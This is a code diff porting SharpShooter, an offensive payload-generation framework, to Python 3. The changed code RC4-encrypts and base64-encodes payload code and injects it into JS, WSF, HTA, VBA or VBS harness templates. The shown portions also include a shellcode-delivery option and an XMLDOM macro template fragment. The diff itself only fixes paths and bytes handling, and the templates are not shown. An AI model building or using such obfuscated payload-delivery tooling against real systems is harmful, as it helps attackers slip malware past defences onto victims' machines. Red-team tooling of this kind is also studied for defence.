@@ -1,4 +1,4 @@
-#! /usr/bin/env python
+#! /usr/bin/env python3
 
 # -*- coding: utf-8 -*-
 #
@@ -19,6 +19,9 @@ import sys
 import argparse
 from jsmin import jsmin
 from modules import *
+
+import os
+BASE = os.path.dirname(os.path.realpath(__file__)) + '/'
 
 try:
     raw_input
@@ -195,17 +198,18 @@ class SharpShooter:
             i = (i + 1) % 256
             j = (j + S[i]) % 256
             S[i], S[j] = S[j], S[i]
-            out.append(chr(ord(char) ^ S[(S[i] + S[j]) % 256]))
+            out.append(ord(char) ^ S[(S[i] + S[j]) % 256])
 
-        return ''.join(out)
+        return bytes(bytearray(out))
 
     def run(self, args):
 
-        template_body = ""
-        template_base = "templates/sharpshooter."
+        template_body = b""
+        template_base = BASE + "templates/sharpshooter."
         shellcode_delivery = False
         shellcode_gzip = ""
         payload_type = 0
+        file_type = ""
 
         macro_template = """    Set XML = CreateObject("Microsoft.XMLDOM")
     XML.async = False
@@ -253,11 +257,11 @@ End Sub"""
             dotnet_version = int(args.dotnetver)
             
             if((args.stageless or stageless_payload is True) and dotnet_version == 2):
-                template_base = "templates/stageless."
+                template_base = BASE + "templates/stageless."
             elif((args.stageless or stageless_payload is True) and dotnet_version == 4):
-                template_base = "templates/stagelessv4."
+                template_base = BASE + "templates/stagelessv4."
             elif(dotnet_version == 4):
-                template_base = "templates/sharpshooterv4."
+                template_base = BASE + "templates/sharpshooterv4."
 
         #print(template_base)
 
@@ -428,7 +432,7 @@ End Sub"""
                 shellcode_payload = shellcode_payload.lower()
                 if (shellcode_payload == "y" or shellcode_payload == "yes"):
                     shellcode_delivery = True
-                    shellcode_template = self.read_file("templates/shellcode.cs")
+                    shellcode_template = self.read_file(BASE + "templates/shellcode.cs")
 
                     shellcode = []
 
@@ -521,35 +525,35 @@ End Sub"""
 
         key = self.rand_key(10)
         payload_encrypted = self.rc4(key, template_code)
-        payload_encoded = base64.b64encode(payload_encrypted.encode(encoding='utf-8'))
+        payload_encoded = base64.b64encode(payload_encrypted)
 
         awl_payload_simple = ""
 
         if("js" in file_type or args.comtechnique):
-            harness = self.read_file("templates/harness.js").decode(encoding='UTF-8')
+            harness = self.read_file(BASE + "templates/harness.js").decode(encoding='UTF-8')
             payload = harness.replace("%B64PAYLOAD%", payload_encoded.decode(encoding='UTF-8'))
             payload = payload.replace("%KEY%", "'%s'" % (key))
             payload_minified = jsmin(payload)
             awl_payload_simple = template_code
         elif("wsf" in file_type):
-            harness = self.read_file("templates/harness.wsf")
+            harness = self.read_file(BASE + "templates/harness.wsf")
             payload = harness.replace("%B64PAYLOAD%", payload_encoded.decode(encoding='utf-8'))
             payload = payload.replace("%KEY%", "'%s'" % (key))
             payload_minified = jsmin(payload)
         elif("hta" in file_type):
-            harness = self.read_file("templates/harness.hta")
+            harness = self.read_file(BASE + "templates/harness.hta")
             payload = harness.replace("%B64PAYLOAD%", payload_encoded.decode(encoding='utf-8'))
             payload = payload.replace("%KEY%", "'%s'" % (key))
             payload_minified = jsmin(payload)
         elif("vba" in file_type):
-            harness = self.read_file("templates/harness.vba")
+            harness = self.read_file(BASE + "templates/harness.vba")
             payload = harness.replace("%B64PAYLOAD%", payload_encoded.decode(encoding='utf-8'))
             payload = payload.replace("%KEY%", "\"%s\"" % (key))
             payload_minified = jsmin(payload)
         elif("slk" in file_type):
             pass
         else:
-            harness = self.read_file("templates/harness.vbs")
+            harness = self.read_file(BASE + "templates/harness.vbs")
             payload = harness.replace("%B64PAYLOAD%", payload_encoded.decode(encoding='utf-8'))
             payload = payload.replace("%KEY%", "\"%s\"" % (key))
 
@@ -558,6 +562,7 @@ End Sub"""
         elif (payload_type == 5):
             file_type = "vbe"
 
+        os.makedirs("output", 0o777, True)
         f = open("output/" + outputfile_payload, 'w')
         #print(payload)
         if(payload_type == 8):
